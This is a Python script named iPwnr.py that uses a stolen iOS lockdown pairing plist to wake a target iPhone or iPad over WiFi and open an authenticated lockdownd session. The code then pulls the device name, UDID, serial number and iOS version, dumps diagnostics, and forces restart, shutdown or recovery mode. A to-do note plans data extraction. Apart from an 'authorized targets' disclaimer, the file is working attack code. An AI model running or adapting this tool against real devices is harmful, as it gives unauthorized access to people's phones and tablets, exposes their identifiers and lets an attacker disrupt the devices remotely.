#!/usr/bin/python
#
# iPwnr.py (incomplete)
#
# Disclaimer: Use at your own risk only against authorized targets. The author makes no warranty, expressed or
# implied, as to the reliability or suitability of this code.
#
# Reads contents of an iDevice pairing config plist and establishes a lockdown session with the specified iDevice.
# Pairing plists can be found in OSX in the /var/db/lockdown folder. You will need to figure out the IP of the
# iDevice with the MAC address contained in the pairing plist (try "arp -a" from the command line or run a sniffer
# on the network for the target MAC).
#
# Targeted iDevice must have previously synched with the computer from which the pairing plist was obtained. Question
# mark at the moment about whether or not WiFi Sync needs to have been enabled at some point. Only tested with iOS 7
# so far.
#
# Sleep mode on an iPhone does not seem to affect connectivity, but limited testing suggests that an iPad Air in sleep
# mode will respond intermittently if at all. WOL frames noted on the wire being sent from iTunes box to iDevices:
#
# 0000   30 f7 c5 85 37 0b 10 40 f3 ec 22 98 08 42 ff ff  0...7..@.."..B..
# 0010   ff ff ff ff 30 f7 c5 85 37 0b 30 f7 c5 85 37 0b  ....0...7.0...7.
# 0020   30 f7 c5 85 37 0b 30 f7 c5 85 37 0b 30 f7 c5 85  0...7.0...7.0...
# 0030   37 0b 30 f7 c5 85 37 0b 30 f7 c5 85 37 0b 30 f7  7.0...7.0...7.0.
# 0040   c5 85 37 0b 30 f7 c5 85 37 0b 30 f7 c5 85 37 0b  ..7.0...7.0...7.
# 0050   30 f7 c5 85 37 0b 30 f7 c5 85 37 0b 30 f7 c5 85  0...7.0...7.0...
# 0060   37 0b 30 f7 c5 85 37 0b 30 f7 c5 85 37 0b 30 f7  7.0...7.0...7.0.
# 0070   c5 85 37 0b 00 00 00 00 00 00                    ..7.......
#
# To do:
# - Add ability to slurp exposed data from iDevice
# - Build better help message
# - Evaluate iOS 8 changes (eg. random re-synchs)
#
# Author: Mario R. De Tore 

import getopt,os,plistlib,socket,ssl,struct,sys,StringIO,tempfile
from awake import wol
from time import sleep
from _ssl import PROTOCOL_SSLv3

# lockdownd pushes plists back and forth with a dword prepended to indicate plist length.
# Socket code lifted from http://stackoverflow.com/questions/17667903/python-socket-receive-large-amount-of-data
def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = ''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def send_plist(handshake_plist,cmd_plist,ip,port,mac_addy,cert=None,key=None,ca=None,SSL=False):

    # Send WOL. OSX doesn't allow writing frames (BSD carryover), so have to resend a few times as UDP packets
    # to allow ARP to kick in.
    for x in range(0, 3):
        wol.send_magic_packet(mac=mac_addy,dest=ip)
        sleep(1)

    # Send plist to lockdownd on target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))

    if SSL:
        sslSocket = ssl.wrap_socket(s,keyfile=key,certfile=cert,ssl_version=PROTOCOL_SSLv3,ca_certs=ca)
        send_msg(sslSocket,cmd_plist)
        response = recv_msg(sslSocket)
        print "Commmand:"
        print cmd_plist
        print "Response:"
        print response
    else:
        send_msg(s,handshake_plist)
        response = recv_msg(s)
        response_dict = plistlib.readPlistFromString(response)
        # Check to make sure we have a SessionID
        if not 'SessionID' in response_dict:
            raise Exception("The response is missing a SessionID (invalid plist?): %s" % response)

        # Do SSL stuff
        if response_dict['EnableSessionSSL']:
            # Transmit the plist
            sslSocket = ssl.wrap_socket(s,keyfile=key,certfile=cert,ssl_version=PROTOCOL_SSLv3,ca_certs=ca)
            send_msg(sslSocket,cmd_plist)
            response = recv_msg(sslSocket)

    return response

def get_info(handshake_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location):
    my_dict = {}
    my_dict['Key'] = 'DeviceName'
    my_dict['Request'] = 'GetValue'

    command_plist = plistlib.writePlistToString(my_dict)

    response = send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
    response_dict = plistlib.readPlistFromString(response)
    info = "Device name: " + response_dict['Value']

    my_dict = {}
    my_dict['Key'] = 'UniqueDeviceID'
    my_dict['Request'] = 'GetValue'

    command_plist = plistlib.writePlistToString(my_dict)

    response = send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
    response_dict = plistlib.readPlistFromString(response)

    info += "\nUDID: " + response_dict['Value']

    my_dict = {}
    my_dict['Key'] = 'SerialNumber'
    my_dict['Request'] = 'GetValue'

    command_plist = plistlib.writePlistToString(my_dict)

    response = send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
    response_dict = plistlib.readPlistFromString(response)

    info += "\nSerial Number: " + response_dict['Value']

    my_dict = {}
    my_dict['Key'] = 'ProductVersion'
    my_dict['Request'] = 'GetValue'

    command_plist = plistlib.writePlistToString(my_dict)

    response = send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
    response_dict = plistlib.readPlistFromString(response)

    info += "\nIOS: " + response_dict['Value']

    return info

def get_diagnostics(handshake_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location):
    my_dict = {}
    my_dict['Request'] = 'StartService'
    my_dict['Service'] = 'com.apple.mobile.diagnostics_relay'
    command_plist = plistlib.writePlistToString(my_dict)
    response = send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
    response_dict = plistlib.readPlistFromString(response)
    PORT = int(response_dict['Port'])

    my_dict = {}
    my_dict['CurrentPlane'] = 'IOService'
    my_dict['Request'] = 'IORegistry'
    command_plist = plistlib.writePlistToString(my_dict)
    response = send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location,SSL=True)

    return response

def do_restart(handshake_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location):
    my_dict = {}
    my_dict['Request'] = 'StartService'
    my_dict['Service'] = 'com.apple.mobile.diagnostics_relay'
    command_plist = plistlib.writePlistToString(my_dict)
    response = send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
    response_dict = plistlib.readPlistFromString(response)
    PORT = int(response_dict['Port'])

    my_dict = {}
    my_dict['Request'] = 'Restart'
    command_plist = plistlib.writePlistToString(my_dict)
    send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location,SSL=True)

    return "Restarting target device."

def do_shutdown(handshake_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location):
    my_dict = {}
    my_dict['Request'] = 'StartService'
    my_dict['Service'] = 'com.apple.mobile.diagnostics_relay'
    command_plist = plistlib.writePlistToString(my_dict)
    response = send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
    response_dict = plistlib.readPlistFromString(response)
    PORT = int(response_dict['Port'])

    my_dict = {}
    my_dict['Request'] = 'Shutdown'
    command_plist = plistlib.writePlistToString(my_dict)
    send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location,SSL=True)

    return "Shutting down target device."

def do_recovery_mode(handshake_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location):
    my_dict = {}
    my_dict['Request'] = 'EnterRecovery'
    command_plist = plistlib.writePlistToString(my_dict)
    send_plist(handshake_plist,command_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
    return "Putting target device into recovery mode."

def main(argv):
    IP = ''
    PORT = 62078
    inputfile = ''
    SSL = False
    cmd = ''

    try:
        opts, args = getopt.getopt(argv, "hp:c:d:i:o:", "")
    except getopt.GetoptError:
        print sys.argv[0] + ' -d <target address> -i <lockdown pairing plist>'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print sys.argv[0] + ' -d <target address> -i <lockdown pairing plist> -c <cmd>'
            sys.exit()
        elif opt == "-i":
            inputfile = arg
        elif opt == "-o":       # Not supported yet
            outputfile = arg
        elif opt == "-p":
            PORT = arg
        elif opt == "-d":
            IP = arg
        elif opt == "-c":
            cmd = arg
    if (IP == '' or inputfile == ''):
        print sys.argv[0] + ' -d <target address> -i <lockdown pairing plist -c <cmd>'
        sys.exit(2)

    # Read in our lockdown pairing plist
    lockdownPairingInfo = plistlib.readPlist(inputfile)

    # Check to make sure we have HostID and SystemBUID
    if not 'HostID' in lockdownPairingInfo or not 'SystemBUID' in lockdownPairingInfo:
        raise Exception("The plist is missing the HostID and/or SystemBUID sections (invalid plist?): %s" % inputfile)

    # Build cert package. Must save certs/key to disk vice reading from memory via StringIO due to limitations of SSL
    # module. Ref:
    # http://stackoverflow.com/questions/12336239/how-to-open-ssl-socket-using-certificate-stored-in-string-variables-in-python

    tmpdirname = tempfile.mkdtemp()
    #print tmpdirname
    my_key = open(tmpdirname + "/1",'w')
    my_key_location = tmpdirname + "/1"
    my_cert = open(tmpdirname + "/11",'w')
    my_cert_location = tmpdirname + "/11"
    my_ca = open(tmpdirname + "/111",'w')
    my_ca_location = tmpdirname + "/111"
    my_key.write(lockdownPairingInfo['HostPrivateKey'].data)
    my_cert.write(lockdownPairingInfo['HostCertificate'].data)
    my_ca.write(lockdownPairingInfo['RootPrivateKey'].data + lockdownPairingInfo['RootCertificate'].data)
    my_key.close()
    my_cert.close()
    my_ca.close()

    # Build our session handshake plist
    my_dict = {}
    my_dict['HostID'] = lockdownPairingInfo['HostID']
    my_dict['Label'] = 'usbmuxd'
    my_dict['ProtocolVersion'] = '2'
    my_dict['Request'] = 'StartSession'
    my_dict['SystemBUID'] = lockdownPairingInfo['SystemBUID']
    my_dict['MAC_addy'] = lockdownPairingInfo['WiFiMACAddress']
    MAC = lockdownPairingInfo['WiFiMACAddress']

    handshake_plist = plistlib.writePlistToString(my_dict)

    # Get identifying data
    data = get_info(handshake_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)

    # Got our response from the iDevice, what to do?
    if data is None:
        print "No response received. Check pairing plist and iDevice IP/MAC address (MAC should be " + lockdownPairingInfo['WiFiMACAddress'] + " according to " + inputfile + ")."
    else:
        # Decision tree needed, instead dumping session request response to STDOUT. At this point a
        # a succesful session request response should look like the following:
        #
        # <?xml version="1.0" encoding="UTF-8"?>
        # <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        # <plist version="1.0">
        # <dict>
        #         <key>EnableSessionSSL</key>
        # 	      <true/>
        # 	      <key>Request</key>
        # 	      <string>StartSession</string>
        # 	      <key>SessionID</key>
        # 	      <string>D267E762-5F46-4CE0-99F7-5C7843E0E113</string>
        # </dict>
        # </plist>
        print data

        if cmd == "recovery":
            print do_recovery_mode(handshake_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
        elif cmd == "diagnostics":
            print get_diagnostics(handshake_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
        elif cmd == "restart":
            print do_restart(handshake_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
        elif cmd == "shutdown":
            print do_shutdown(handshake_plist,IP,PORT,MAC,my_cert_location,my_key_location,my_ca_location)
        else:
            print sys.argv[0] + ' -d <target address> -i <lockdown pairing plist -c <cmd>'
            sys.exit(2)

if __name__ == "__main__":
   main(sys.argv[1:])
